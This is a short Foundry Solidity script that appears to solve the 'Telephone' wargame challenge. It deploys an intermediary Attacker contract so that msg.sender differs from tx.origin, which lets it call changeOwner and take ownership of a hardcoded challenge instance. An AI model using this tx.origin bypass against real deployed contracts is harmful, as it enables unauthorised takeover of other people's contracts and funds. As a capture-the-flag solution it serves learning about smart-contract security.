// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { Telephone } from "../src/04_Telephone.sol";

contract Attacker {
  constructor (address challengeInstanceAddress) {
    Telephone challenge = Telephone(challengeInstanceAddress);
    challenge.changeOwner(msg.sender);
    
    console.log("Owner: %s", challenge.owner());
  }
}

contract TelephoneAttacker is Script {

  address challengeInstanceAddress = 0x5B70DeF289E41b7FEabB8bEB5C9fEda5b4ee4194;
  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {
    vm.startBroadcast(deployerPrivateKey);
    new Attacker(challengeInstanceAddress);
    vm.stopBroadcast();
  }

}